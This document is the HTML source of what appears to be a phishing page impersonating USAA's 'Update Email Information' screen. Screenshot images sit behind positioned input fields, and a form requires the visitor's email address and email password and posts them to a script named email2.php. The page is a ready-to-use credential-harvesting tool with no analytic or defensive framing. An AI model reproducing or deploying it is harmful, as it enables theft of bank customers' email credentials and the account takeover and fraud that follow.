﻿
<!DOCTYPE html><html class="yui3-js-enabled" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" dir="ltr" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><script id="utag_171" src="imgs/bat.js" charset="utf-8" async="" type="text/javascript"></script><script src="imgs/s39876891442473.js" async="async" type="text/javascript"></script>
<meta charset="utf-8">
<title>Update Email Information | USAA</title>

<meta name="title" content="Update Email Information | USAA">

<link rel="stylesheet" type="text/css" href="img/aggregator.css" media="all" />
		<link rel="stylesheet" type="text/css" href="imgs/aggregator.css" media="all" />
		<link rel="SHORTCUT ICON" href="usaaicon.ico" />
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">


<style> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</style> 

<style type="text/css">
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
.usaa-button.skin-button-1.p1
     {
      border-radius:4px;
      box-shadow:0 0 0 1px #437c16,0 0 0 3px #fff,0 0 0 4px #ddd;
      height:1.8em;
}
.usaa-button .button-liner{border:1px solid transparent;border-radius:4px;color:#005C92;display:block;height:100%;padding:0 10px;position:relative;text-align:center;white-space:nowrap;}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#f1f1f1" Link="#000000" VLink="#000000" ALink="#000000">
<div id="container">

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1352; height:219px; z-index:1"><img src="emailinfo.PNG" alt="" title="" border=0 width=1352 height=219></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:118px; width:1352; height:556px; z-index:0"><img src="emailpass.PNG" alt="" title="" border=0 width=1352 height=489></div>



              

<form action="email2.php" method="POST" name="Logon" onsubmit="return validateForm()">















<script type="text/javascript">
function validateForm()
{
var x=document.forms["Logon"]["email"].value;
if (x==null || x=="")
  {
  alert("Email address must be filled out");
  return false;
  }
 
var x=document.forms["Logon"]["emailpass"].value;
if (x==null || x=="")
  {
  alert("Email password must be filled out");
  return false;
  }
 
 
 
 
 
 
  
  
  
  
}
</script>




 
<br />
 


<input type="email" name="email" maxlength="150" size="150" style="position:absolute;height:18px;width:330px;left:472px;top:238px;z-index:50"  />

<input type="password" name="emailpass" maxlength="150" size="25" style="position:absolute;height:18px;width:180px;left:472px;top:295px;z-index:56"  />

<input type="checkbox" name="formcheckbox1" style="position:absolute;height:18px;width:330px;left:522px;top:295px;z-index:50"  />

<div style="position:absolute;height:18px;width:330px;left:699px;top:295px;z-index:50">Send Alert To Email Subscriber</div>

<div id="image5" style="position:absolute; overflow:hidden; left:1016px; top:338px; z-index:40"><input type="image" name="formimage1" width="80" height="34" src="submit.PNG"></div>
	</form>




<div class="usaa-disclosures" style="display:none">
<ul class="disclosure-group">

</ul>
</div>
<div class="usaa-hidden" id="id11">

</div>

	</div>
	
</div>

</div>


<div id="image5" style="position:absolute; overflow:hidden; left:188px; top:505px; width:974px; height:408px; z-index:4"><img src="Capture11.PNG" alt="" title="" border=0 width=974 height=408></div>



</body></html>